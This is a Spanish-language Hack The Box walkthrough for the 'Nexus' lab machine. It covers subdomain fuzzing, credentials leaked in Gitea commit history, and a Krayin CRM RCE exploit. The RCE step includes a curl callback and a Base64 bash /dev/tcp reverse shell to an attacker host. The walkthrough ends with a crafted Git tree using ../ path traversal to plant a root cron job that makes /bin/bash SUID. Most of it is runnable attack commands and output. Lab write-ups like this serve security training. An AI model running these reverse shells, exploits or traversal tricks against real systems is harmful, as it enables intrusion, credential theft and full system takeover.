---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Nexus HackTheBox (Easy)

# Contexto de la maquina

## Trayectoria Nexus

<figure><img src="../../.gitbook/assets/trayectoria_1c485bb7bb.png" alt=""><figcaption></figcaption></figure>

## Descripción

**Nexus** es una máquina Linux de dificultad **Easy** que combina la explotación de una aplicación web de gestión empresarial (**Krayin CRM**) con una vulnerabilidad de escritura arbitraria de archivos a través de **Path Traversal** en un script de sincronización de Gitea ejecutado como `root`.

La cadena de compromiso comienza con el descubrimiento de dos subdominios: una instancia de **Gitea** con un repositorio público que filtra credenciales en el historial de commits del archivo `.env`, y la propia instancia de **Krayin CRM** donde esas credenciales dan acceso como administrador. Desde ahí se explota un RCE preautenticado (CVE-2026-38526) para obtener shell como `www-data`. La escalada posterior reutiliza contraseñas entre la base de datos de Krayin y el sistema operativo, llegando al usuario `jones`. Finalmente, se abusa de un script Python ejecutado periódicamente como `root` que sincroniza repositorios de Gitea sin validar las rutas de los archivos, permitiendo escribir un crontab malicioso en `/etc/cron.d/` mediante Path Traversal desde un repositorio controlado.

**Objetivo**

- Descubrir credenciales filtradas en el historial de Git de un repositorio público de Gitea.
- Explotar Krayin CRM 2.2.0 para obtener RCE como `www-data`.
- Reutilizar credenciales de la base de datos para escalar al usuario `jones`.
- Abusar del script `template-sync.py` ejecutado como `root` para escribir un crontab malicioso vía Path Traversal.

**Tipo de máquina**

- Plataforma: Hack The Box
- Sistema operativo: Linux
- Categoría principal: Web
- Componentes involucrados:
    - FFUF para descubrimiento de subdominios.
    - Gitea con repositorio público y credenciales en historial de commits.
    - Krayin CRM 2.2.0 con RCE preautenticado.
    - Reutilización de credenciales de base de datos.
    - Script Python de sincronización de Gitea ejecutado como root.
    - Path Traversal en nombres de archivo Git para escritura arbitraria.
    - Crontab malicioso para SUID en bash.

**Habilidades y técnicas evaluadas**

- Enumeración de subdominios con FFUF.
- Análisis del historial de commits de repositorios Git públicos.
- Explotación de RCE en Krayin CRM (CVE-2026-38526).
- Codificación de payloads en Base64 para evitar problemas de caracteres especiales.
- Tratamiento y estabilización de TTY.
- Extracción de credenciales desde archivos `.env`.
- Reutilización de contraseñas entre aplicaciones y sistema operativo.
- Creación de tokens de API en Gitea.
- Construcción manual de objetos Git (blob, tree, commit) para manipular rutas de archivos.
- Path Traversal mediante nombres de archivo en árboles Git.
- Abuso de crontabs del sistema para escalada de privilegios.
## Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/carta_Credenciales_expuestas_en_hist_1783766342508.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_RCE_preautenticado_en_Krayin_C_1783766342987.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Contrase_a_de_base_de_datos_re_1783766343595.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Path_Traversal_en_script_de_si_1783766344123.png" alt=""><figcaption></figcaption></figure>

# Escaneo de puertos

Comenzamos realizando un escaneo completo de todos los puertos TCP para identificar los servicios expuestos en la máquina objetivo. El flag `--open` nos filtra solo los puertos abiertos, `-sS` realiza un escaneo SYN (sigiloso), y `--min-rate 5000` acelera el proceso enviando al menos 5000 paquetes por segundo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un segundo escaneo más detallado sobre ellos para obtener las versiones exactas de los servicios y ejecutar los scripts de detección por defecto de Nmap (`-sCV`).

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 12:31 +0000
Nmap scan report for 10.129.66.149
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/

Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
```

Solo dos puertos abiertos:

- **Puerto 22** → SSH (OpenSSH 9.6p1), de momento no explotable directamente.
- **Puerto 80** → HTTP (nginx 1.24.0), con redirección al dominio `nexus.htb`.
## Añadir dominio al /etc/hosts

```bash
nano /etc/hosts

# Dentro del nano añadimos la siguiente línea:
<IP>           nexus.htb
```
## Enumeración web

Accedemos al dominio:

```
URL = http://nexus.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260711092656.png" alt=""><figcaption></figcaption></figure>

Página aparentemente normal. Realizamos fuzzing de subdominios para descubrir si hay servicios adicionales.
# FFUF
## Fuzzing de subdominios (VHost)

```bash
ffuf -c -w subdomains-top1million-110000.txt -u "http://nexus.htb" -H "Host: FUZZ.nexus.htb" -t 100 -fw 4
```

Resultado:

```
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 45ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 102ms]
```

Encontramos dos subdominios. Los añadimos al archivo de hosts:

```bash
nano /etc/hosts

# Dentro del nano dejamos la línea así:
<IP>           nexus.htb git.nexus.htb billing.nexus.htb
```
## Análisis de los subdominios

Accedemos a ambos:

```
URL = http://git.nexus.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260711093229.png" alt=""><figcaption></figcaption></figure>

```
URL = http://billing.nexus.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260711093239.png" alt=""><figcaption></figcaption></figure>

El subdominio `git` aloja una instancia de **Gitea**, una plataforma de control de versiones similar a GitHub pero auto-hospedada. El registro está deshabilitado, pero accediendo a la sección `Explore` encontramos repositorios públicos accesibles sin autenticación.

El subdominio `billing` aloja **Krayin CRM**, un sistema de gestión de relaciones con clientes. Requiere login con correo electrónico.
## Análisis del repositorio público en Gitea

<figure><img src="../../.gitbook/assets/vuln_Credenciales_expuestas_en_hist_b0910512.png" alt=""><figcaption></figcaption></figure>

En la sección `Explore` de Gitea encontramos un repositorio público:

<figure><img src="../../.gitbook/assets/Pasted image 20260711093408.png" alt=""><figcaption></figcaption></figure>

Es un repositorio con el `docker-compose` que despliega la plataforma Krayin del subdominio `billing`. Lo más interesante no es el contenido actual sino el **historial de commits** del archivo `.env`. Git conserva todos los cambios históricos, y es habitual que credenciales eliminadas en un commit posterior sigan siendo accesibles en los commits anteriores:

<figure><img src="../../.gitbook/assets/Pasted image 20260711093512.png" alt=""><figcaption></figcaption></figure>
## Extracción de credenciales del historial de commits

Revisando los commits anteriores del `.env` encontramos que hubo dos cambios. En la versión anterior del archivo la contraseña estaba en texto plano:

<figure><img src="../../.gitbook/assets/Pasted image 20260711095546.png" alt=""><figcaption></figcaption></figure>

```
Pass: N27xh!!2ucY04
```

La contraseña fue eliminada del `.env` en un commit posterior, pero Git la conserva en el historial. Para el usuario, esto puede dar una falsa sensación de seguridad: eliminar un dato sensible de un repositorio no borra su historial.
## Acceso a Krayin CRM con las credenciales recuperadas

La página principal de `nexus.htb` mostraba dos correos electrónicos de contacto. Probamos las credenciales con el correo del manager `j.matthew@nexus.htb`:

<figure><img src="../../.gitbook/assets/Pasted image 20260711095702.png" alt=""><figcaption></figcaption></figure>

```
User: j.matthew@nexus.htb
Pass: N27xh!!2ucY04
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260711095841.png" alt=""><figcaption></figcaption></figure>

Las credenciales funcionan. Estamos dentro de Krayin CRM. Consultamos la versión exacta del software en el perfil de usuario:

<figure><img src="../../.gitbook/assets/Pasted image 20260711100319.png" alt=""><figcaption></figcaption></figure>

La versión es **v2.2.0**. Buscando vulnerabilidades para esta versión encontramos el CVE-2026-38526, un RCE que afecta a toda la rama 2.2.x.
# Escalate user www-data

<figure><img src="../../.gitbook/assets/vuln_RCE_preautenticado_en_Krayin_C_4281f614.png" alt=""><figcaption></figcaption></figure>

## CVE-2026-38526 — RCE en Krayin CRM 2.2.x

El **CVE-2026-38526** afecta a Krayin CRM en sus versiones 2.2.x y permite a un usuario autenticado ejecutar comandos arbitrarios en el servidor aprovechando un endpoint de la aplicación que procesa datos sin la sanitización adecuada. El resultado es ejecución de código con los privilegios del proceso web (`www-data`).

El PoC está disponible en:

URL = [Exploit GitHub CVE-2026-38526](https://github.com/NathanHimself/CVE-2026-38526-PoC)
## Verificación del RCE

Antes de lanzar la reverse shell, verificamos que el exploit funciona correctamente enviando un `curl` a nuestro servidor HTTP:

```bash
python3 -m http.server 80
```

```bash
python3 exploit.py -t 'http://billing.nexus.htb/' -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -c 'curl http://<IP_ATTACKER>/pwned'
```

En el servidor HTTP recibimos:

```
10.129.66.149 - - [11/Jul/2026 13:09:34] "GET /pwned HTTP/1.1" 404 -
```

El servidor hace la petición desde su propia IP, confirmando que el RCE está activo.
## Obtención de la reverse shell

Nos ponemos a la escucha:

```bash
nc -lvnp <PORT>
```

Para evitar problemas con caracteres especiales en la URL codificamos el payload en Base64. Primero generamos el string codificado:

```bash
echo -n 'bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT_ATTACKER> 0>&1' | base64
```

Resultado:

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMS83Nzc3IDA+JjE=
```

Ahora enviamos el payload a través del exploit. El comando decodifica el Base64 en tiempo de ejecución y lo pasa directamente a bash, evitando que los caracteres especiales (`>`, `&`) sean interpretados incorrectamente por el shell del servidor:

```bash
python3 exploit.py -t 'http://billing.nexus.htb/' -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMS83Nzc3IDA+JjE= | base64 -d | bash'
```

Si volvemos donde tenemos la escucha:

```
listening on [any] 7777 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.66.149] 43724
www-data@nexus:~/krayin/storage/app/public/tinymce$ whoami
www-data
```

Tenemos shell como `www-data`. Sanitizamos la TTY.
## Sanitizacion shell (TTY)

La shell obtenida a través de una reverse shell suele ser muy limitada: no tiene autocompletado, no permite usar atajos de teclado como `Ctrl+C` sin matar la sesión, y en general es bastante incómoda. Por eso realizamos el siguiente proceso para convertirla en una TTY completamente interactiva:

```shell
script /dev/null -c bash
```

```shell
# Suspendemos el proceso con Ctrl+Z
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Consultamos las dimensiones de nuestra terminal local
stty size

# Ajustamos las dimensiones de la shell remota para que coincidan
stty rows <ROWS> columns <COLUMNS>
```
# Escalate user jones

<figure><img src="../../.gitbook/assets/vuln_Contraseña_de_base_de_datos_re_5f5be513.png" alt=""><figcaption></figcaption></figure>

## Extracción de credenciales desde el .env de Krayin

Los usuarios con shell en el sistema son `root`, `jones` y `git`. Antes de intentar nada más, leemos el archivo `.env` de la propia instalación de Krayin, que contiene las credenciales de la base de datos:

```bash
cat /var/www/krayin/.env
```

Resultado:

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```
## Reutilización de credenciales

Probamos esa contraseña directamente para el usuario `jones`. Es habitual que los desarrolladores reutilicen la misma contraseña para la base de datos y para su cuenta del sistema:

```bash
su jones
# Contraseña: y27xb3ha!!74GbR
```

Resultado:

```
jones@nexus:/var/www$ whoami
jones
```

Funciona. Leemos la flag del usuario:

> user.txt

```
a4928b0b8b2948339c61d35b25f390d0
```
# Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln_Path_Traversal_en_script_de_si_78e8bd17.png" alt=""><figcaption></figcaption></figure>

## Identificación del timer de systemd sospechoso

Listamos todos los timers de systemd activos para identificar tareas periódicas que puedan ser explotables:

```bash
systemctl list-timers
```

Resultado:

```
NEXT                           LEFT    UNIT                          ACTIVATES
Sat 2026-07-11 08:36:40 UTC    22s     gitea-template-sync.timer     gitea-template-sync.service
```

El timer `gitea-template-sync` se ejecuta periódicamente. Leemos la unidad de servicio asociada:

```bash
systemctl cat gitea-template-sync.service
```

Resultado:

```
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

El script se ejecuta como `root`. Leemos su código completo:

```bash
cat /etc/gitea/template-sync.py
```
## Análisis de la vulnerabilidad en template-sync.py

El script hace lo siguiente: obtiene un token de API de Gitea desde un archivo de configuración, lista todos los repositorios marcados como `template`, y para cada uno extrae sus archivos al directorio de staging `/home/git/template-staging/`.

El bloque crítico es este:

```python
result = subprocess.run(
    GIT + ['ls-tree', '-r', 'HEAD'],
    cwd=bare_path,
    capture_output=True, text=True
)
# ...
for line in result.stdout.strip().split('\n'):
    parts = line.split('\t', 1)
    meta, filepath = parts          # filepath viene directamente de git ls-tree
    # ...
    target = os.path.join(stage_path, filepath)   # NO hay validación de filepath
    os.makedirs(target_dir, exist_ok=True)
    with open(target, 'wb') as f:
        f.write(cat_result.stdout)
```

El problema está en que `filepath` se toma directamente del output de `git ls-tree` sin ninguna validación. Si el repositorio contiene un archivo cuya ruta empiece por `../`, la función `os.path.join(stage_path, filepath)` producirá una ruta que escapa del directorio de staging. El script entonces creará los directorios necesarios y escribirá el archivo en esa ruta con privilegios de `root`.

Para explotar esto necesitamos un token de API de Gitea, que podemos obtener autenticándonos como `jones` (ya que comparte contraseña con su cuenta de Gitea).
## Creación del token de API en Gitea

Accedemos a la interfaz web de Gitea (`http://git.nexus.htb`) con las credenciales de `jones`:

```
User: jones
Pass: y27xb3ha!!74GbR
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260711105456.png" alt=""><figcaption></figcaption></figure>

Navegamos a `User Settings` → `Applications` y generamos un token con permisos completos:

<figure><img src="../../.gitbook/assets/Pasted image 20260711105713.png" alt=""><figcaption></figcaption></figure>

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260711105946.png" alt=""><figcaption></figcaption></figure>

> TOKEN:

```
2d235744f9a6e2944d49e0b00ec3d7cdff3e59a2
```
## Creación del repositorio template malicioso

Desde la shell de `jones` en la máquina víctima, creamos un repositorio marcado como `template` (requisito para que el script lo procese) usando la API de Gitea:

```bash
curl -X POST http://localhost:3000/api/v1/user/repos \
  -H "Authorization: token 2d235744f9a6e2944d49e0b00ec3d7cdff3e59a2" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwned","template":true,"private":false}'
```

La respuesta confirma que el repositorio `jones/pwned` se creó correctamente y está marcado como template.
## Construcción del árbol Git malicioso con Path Traversal

El payload que queremos escribir es un crontab del sistema que activará el bit SUID en `/bin/bash`. Los crontabs en `/etc/cron.d/` tienen la sintaxis `* * * * * usuario comando`, donde el campo `usuario` indica con qué usuario se ejecuta:

```
* * * * * root chmod u+s /bin/bash
```

Clonamos el repositorio recién creado y lo configuramos:

```bash
cd /tmp
git clone http://localhost:3000/jones/pwned.git
cd pwned
git config user.email "pwned@root.com"
git config user.name "pwned"
```

Creamos el archivo de payload y lo añadimos como objeto blob al repositorio:

```bash
echo '* * * * * root chmod u+s /bin/bash' > cron-payload
BLOB=$(git hash-object -w cron-payload)
echo "BLOB: $BLOB"
```

Resultado:

```
BLOB: aba2658a869798313467776132f8ff1757c1123a
```

Ahora construimos manualmente un árbol Git con una ruta maliciosa. En lugar de crear el árbol con los comandos habituales de Git (que normalizarían la ruta), lo construimos directamente a nivel de objeto para poder incluir `../` en el `filepath`. El script de Python calcula el hash SHA1 del objeto árbol, lo comprime con zlib y lo guarda en la carpeta de objetos de Git:

```bash
python3 << EOF
import hashlib, zlib, os

blob_hash = "aba2658a869798313467776132f8ff1757c1123a"
file_mode = b"100644"
# 8 niveles de path traversal para salir del staging dir y llegar a /etc/cron.d/
file_path = b"../../../../../../../../etc/cron.d/root-shell"
null_byte = b"\x00"
blob_bytes = bytes.fromhex(blob_hash)

tree_entry = file_mode + b" " + file_path + null_byte + blob_bytes
tree_content = b"tree " + str(len(tree_entry)).encode() + b"\x00" + tree_entry

tree_sha1 = hashlib.sha1(tree_content).hexdigest()
compressed = zlib.compress(tree_content)
os.makedirs(f".git/objects/{tree_sha1[:2]}", exist_ok=True)
with open(f".git/objects/{tree_sha1[:2]}/{tree_sha1[2:]}", "wb") as f:
    f.write(compressed)

print(f"TREE: {tree_sha1}")
EOF
```

Resultado:

```
TREE: c125cc310e5c9652e786d6d56d8573a9c4216a15
```

Creamos el commit apuntando al árbol malicioso y lo subimos al repositorio:

```bash
COMMIT=$(git commit-tree -m "path traversal payload" c125cc310e5c9652e786d6d56d8573a9c4216a15)
git update-ref refs/heads/main $COMMIT
git push http://jones:2d235744f9a6e2944d49e0b00ec3d7cdff3e59a2@localhost:3000/jones/pwned.git main --force
```

Resultado:

```
Writing objects: 100% (3/3), 264 bytes | 264.00 KiB/s, done.
remote: Processed 1 references in total
To http://localhost:3000/jones/pwned.git
 + 1d382ac...d489b4b main -> main (forced update)
```
## Monitorización de la ejecución y escalada a root

Esperamos a que el timer dispare el script. Monitorizamos el log de ejecución:

```bash
cat /var/log/template-sync.log
```

Resultado:

```
[2026-07-11 09:15:42] Found 1 template repo(s)
[2026-07-11 09:15:42] Syncing template: jones/pwned
[2026-07-11 09:15:42]   synced: ../../../../../../../../etc/cron.d/root-shell
[2026-07-11 09:15:42] Template sync complete
```

El script procesó el repositorio y escribió el archivo siguiendo la ruta maliciosa sin validación alguna. Verificamos que el crontab fue creado en la ruta correcta:

```bash
cat /etc/cron.d/root-shell
```

Resultado:

```
* * * * * root chmod u+s /bin/bash
```

Esperamos un minuto a que `cron` ejecute la tarea y verificamos el resultado:

```bash
ls -la /bin/bash
```

Resultado:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

El bit SUID está activo. Escalamos a `root` con el flag `-p`, que indica a bash que preserve los privilegios del propietario del binario en lugar de usar los del usuario que lo lanza:

```bash
bash -p
```

Resultado:

```
bash-5.2# whoami
root
```

Ya somos `root`. Leemos la flag final:

> root.txt

```
4067d143149e8b859ec6cfb28c25200d
```

